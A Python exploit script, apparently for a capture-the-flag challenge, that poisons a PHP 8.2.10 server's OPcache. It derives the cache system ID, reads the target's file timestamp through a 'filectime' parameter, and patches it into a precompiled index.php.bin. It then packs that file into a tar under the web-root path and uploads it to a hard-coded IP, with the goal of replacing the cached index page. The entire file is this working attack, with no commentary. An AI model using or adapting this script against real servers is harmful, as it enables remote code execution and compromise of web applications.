import binascii
import hashlib
import requests
import re
import tarfile
import subprocess
import os
url = "http://43.143.192.19:1145/?LuckyE=filectime"

sys_id = hashlib.md5("8.2.10API420220829,NTSBIN_4888(size_t)8\002".encode("utf-8")).hexdigest()
print(sys_id)


def timec():
    pattern = r"\d{10}"
    timeres = requests.get(url=url)
    match = re.search(r'int\((\d{10})\)', timeres.text)

    # 检查是否有匹配
    try:
        # 提取匹配到的数字
        ten_digit_number = match.group(1)
        print(ten_digit_number)
        return  ten_digit_number
    except:
        print('dame')
def split_string_into_pairs(input_string):
    # 检查输入字符串的长度
    if len(input_string) % 2 != 0:
        raise ValueError("输入字符串的长度必须是偶数。")

    # 使用切片操作将字符串分割成两位一组的子字符串
    pairs = [input_string[i:i+2] for i in range(0, len(input_string), 2)]
    return pairs
def totime(time):
    b = split_string_into_pairs(f"{hex(int(time))}")
    b.pop(0)
    s = ''

    for i in range(0, len(b)):
        s += b[-1]
        b.pop(-1)

    return s

def changetime():
    with open("index.php.bin","rb") as file:
        binary_data = file.read()
        # 将二进制数据转换为十六进制字符串
        hex_data = binascii.hexlify(binary_data).decode('utf-8')
        new_data = hex_data[0:128]+totime(timec())+hex_data[136:]
        with open("index.php.bin","wb") as f:
            f.write(bytes.fromhex(new_data))

changetime()
def tar_file():
    tar_filename = 'exp.tar'
    with tarfile.open(tar_filename,'w') as tar:
        directory_info = tarfile.TarInfo(name=f'{sys_id}/var/www/html')
        directory_info.type = tarfile.DIRTYPE
        directory_info.mode = 0o777

        tar.addfile(directory_info)

        tar.add('index.php.bin', arcname=f'{sys_id}/var/www/html/index.php.bin')

tar_file()
def upload():
    file = {"file":("exp.tar",open("exp.tar","rb").read(),"application/x-tar")}
    res  = requests.post(url=url,files=file)
    print(res.request.headers)
    return res.request
request_content = upload()
upload_body = str(request_content.body).replace("\"","\\\"")
content_length = request_content.headers['Content-Length']
print(content_length)
print(upload_body)


